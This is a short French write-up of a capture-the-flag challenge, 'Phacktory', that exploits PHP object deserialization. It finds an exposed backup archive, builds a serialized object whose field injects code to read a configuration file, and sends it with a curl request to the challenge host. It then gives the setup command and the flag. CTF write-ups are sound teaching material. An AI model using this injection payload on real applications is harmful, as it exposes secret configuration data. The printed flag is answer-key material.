# Phacktory
## Challenge

Un nouveau magasin de fabrication de chocolat ouvre en ville.  
Soit le premier à passer commande !


## Résolution

**Reconnaissance**

/backup.zip est présent

**Création de le charge utile.**

```php
$fact = new PHackTory();
$fact->type = "echo";
$fact->quantity = "file_get_contents('config-126546845171616835186.php');";
echo serialize($fact);
```

**Exploitation**

```bash
curl -X POST "http://phacktory.phack.fr?what=is&the=flag&please=O%3A9%3A%22PHackTory%22%3A3%3A%7Bs%3A4%3A%22type%22%3Bs%3A4%3A%22echo%22%3Bs%3A8%3A%22quantity%22%3Bs%3A32%3A%22file_get_contents%28%27config-126546845171616835186.php%27%29%3B%22%3Bs%3A5%3A%22order%22%3Bs%3A5%3A%22milky%22%3B%7D" --data "is=1539&cool"
```

## Setup

```
docker-compose up --build -d
```

## Flag

```
PHACK{l3s_cl0Ch3s_s0nT_p4s5ees_!}
```